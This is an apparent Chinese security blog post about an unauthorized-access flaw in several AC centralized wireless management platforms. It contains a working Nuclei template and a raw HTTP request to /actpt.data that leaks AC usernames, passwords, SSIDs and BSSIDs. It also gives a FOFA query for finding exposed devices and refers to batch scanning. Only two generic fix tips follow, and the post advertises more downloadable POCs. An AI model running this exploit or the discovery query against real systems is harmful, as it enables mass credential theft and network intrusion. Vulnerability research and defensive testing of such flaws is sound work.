#  多款AC集中管理平台未授权漏洞【漏洞复现|附nuclei-POC】   
 脚本小子   2024-11-27 00:50  
  
****  
**免责声明：**  
**本文内容仅供技术学习参考，请勿用于违法破坏。利用此文所提供的信息或者工具而造成的任何直接或者间接的后果及损失，均由使用者本人负责，与作者无关。如有侵权请联系删除。**  
  
****  
****  
**漏洞描述：**  
  
AC集中管理平台未授权漏洞。  
  
攻击者可通过访问未授权路径，非法获取包括AC用户名、密码、SSID（服务集标识符）、AP BSSID（接入点基站标识符）等在内的敏感及关键信息，对系统安全构成重大威胁。  
  
  
  
01  
  
—  
  
**Nuclei POC**  
  
  
```
id: AC-jizhongguanlipingtai-unauthorized

info:
  name: 多款AC集中管理平台未授权漏洞

  author: kingkong
  severity: high
  metadata:
    fofa-query: header="HTTPD_ac 1.0"

http:
  - raw:
      - |
        GET /actpt.data HTTP/1.1
        Host: {{Hostname}}
        Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
        Accept-Encoding: gzip, deflate
        Accept-Language: zh-CN,zh;q=0.9
        Cache-Control: max-age=0
        Connection: keep-alive
        Upgrade-Insecure-Requests: 1
        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Safari/537.36

    matchers-condition: and
    matchers:
      - type: dsl
        dsl:
              - 'status_code_1 == 200'
              - 'contains(body_1,"username")'
        condition: and

```  
  
  
  
02  
  
—  
  
搜索语法  
```
FOFA：header="HTTPD_ac 1.0"
```  
  
![](https://mmbiz.qpic.cn/mmbiz_png/aEP4jW2ohneubibiaIicaogdDNqyve7j187AiaZfBEH2EnchTLsBjvpPMp2wpvkPHLtu8ov93TROKmFCo89xQx1Z2Q/640?wx_fmt=png&from=appmsg "")  
  
界面如下  
  
![](https://mmbiz.qpic.cn/mmbiz_png/aEP4jW2ohneubibiaIicaogdDNqyve7j1871t3gpeTueZ7eyCXFbwXWSRMDJbwBoqaarMbfYtdzBbD5zeeJ8OqnCg/640?wx_fmt=png&from=appmsg "")  
  
03  
  
—  
  
漏洞复现  
  
![](https://mmbiz.qpic.cn/mmbiz_png/aEP4jW2ohneubibiaIicaogdDNqyve7j187MJzx0sAVicjYYMW03m2J2aVa2JXrUEeeeqhYg94xGQY5n6qvsPeDsfg/640?wx_fmt=png&from=appmsg "")  
漏洞检测POC  
```
GET /actpt.data HTTP/1.1
Host: 
User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; rv:52.0) Gecko/20100101 Firefox/52.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate
DNT: 1
Connection: close
Upgrade-Insecure-Requests: 1


```  
  
  
neclei批量检测截图  
  
![](https://mmbiz.qpic.cn/mmbiz_png/aEP4jW2ohneubibiaIicaogdDNqyve7j1872R6Oxibicfa4mwfBu1uCN4ujvtMdzgZ4PMJX8kwFOqFwxhaK0qOGK9xQ/640?wx_fmt=png&from=appmsg "")  
  
  
04  
  
—  
  
修复建议  
  
  
1、强化身份验证和访问控制：实施强密码策略、多因素身份验证，并根据用户角色和权限设置适当的访问控制。2、安全配置：确保系统和应用程序的安全配置，包括正确的文件和目录权限设置、网络访问控制等  
  
05  
  
—  
  
下载地址  
  
  
进入公众号点击POC可获取所有POC文件  
  
![](https://mmbiz.qpic.cn/mmbiz_png/aEP4jW2ohneS7aOPfDNKhvOicibVlyrkJ3A4EuUx5c5S8eAxFnF9KiaibAGJfP6ibB6ze4Rm4pZ7MI4jQibT05lTevqg/640?wx_fmt=other&from=appmsg&tp=webp&wxfrom=5&wx_lazy=1&wx_co=1 "")  
  
  
  
  
  
  
